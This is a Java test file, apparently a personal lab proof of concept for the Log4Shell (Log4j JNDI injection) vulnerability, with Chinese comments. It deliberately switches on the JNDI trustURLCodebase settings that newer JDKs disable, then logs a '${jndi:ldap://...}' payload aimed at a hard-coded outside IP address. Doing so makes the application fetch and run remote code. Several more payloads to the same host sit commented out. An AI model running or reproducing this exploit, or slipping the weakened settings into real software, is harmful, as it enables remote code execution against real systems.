package fortestlog2j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Test {
//    利用LogMamager获取一个Logger对象
    private static final Logger loger = LogManager.getLogger(Test.class);

    public static void main(String[] args) {
//        jdni rmi 受限制:JDK 7u122, JDK 8u113之后
//        com.sun.jndi.rmi.object.trustURLCodebase、
//        com.sun.jndi.cosnaming.object.trustURLCodebase

//        jndi ldap 受限制:JDK 11.0.1、8u191、7u201、6u211之后
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.naming.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

//        调用Logger的error方法写入poc，直接触发漏洞
//        loger.error("${jndi:ldap://121.196.109.163:8681/Evalforcalc}");
//        loger.fatal("${jndi:ldap://121.196.109.163:8681/Evalforcalc}");
//          loger.error("${jndi:ldap://121.196.109.163:1389/wfcfau}");
          loger.fatal("${jndi:ldap://121.196.109.163:1389/u1qxxr}");
    }
}
